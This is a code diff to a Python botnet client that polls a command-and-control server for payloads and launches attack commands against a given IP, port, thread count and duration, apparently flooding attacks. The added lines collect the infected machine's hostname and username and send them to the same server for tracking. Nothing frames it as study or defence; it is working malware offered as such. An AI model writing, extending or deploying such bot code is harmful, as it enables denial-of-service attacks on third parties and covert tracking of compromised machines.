@@ -1,9 +1,17 @@
 import requests
 import subprocess
 import time
+import socket
+import getpass
 
 API_URL = "https://botnet.gosyntech.in/botnet/?token=wrfn34r9h9B98VK9j"
+TRACK_URL = "https://botnet.gosyntech.in/botnet/track_bot/"
 POLL_INTERVAL = 2  # seconds
+
+# Get hostname and username once
+hostname = socket.gethostname()
+username = getpass.getuser()
+full_host = f"{hostname}_{username}"
 
 def get_payload():
     try:
@@ -12,6 +20,16 @@ def get_payload():
     except Exception as e:
         print(f"[ERROR] Failed to fetch payload: {e}")
         return None
+
+def send_tracking():
+    try:
+        response = requests.get(f"{TRACK_URL}?hostname={full_host}", timeout=5)
+        if response.status_code == 200:
+            print(f"[TRACKING] Sent: {full_host}")
+        else:
+            print(f"[TRACKING] Failed ({response.status_code})")
+    except Exception as e:
+        print(f"[ERROR] Failed to send tracking: {e}")
 
 def run_command(method, ip, port, threads, duration):
     if port == "9999999":
@@ -32,8 +50,9 @@ def run_command(method, ip, port, threads, duration):
         print(f"[ERROR] Failed to run command: {e}")
 
 def main():
-    print("🌐 Botnet Listener Started.")
+    print("🌐 Botnet Listener & Tracker Started.")
     while True:
+        send_tracking()
         payload_data = get_payload()
 
         if payload_data is None:
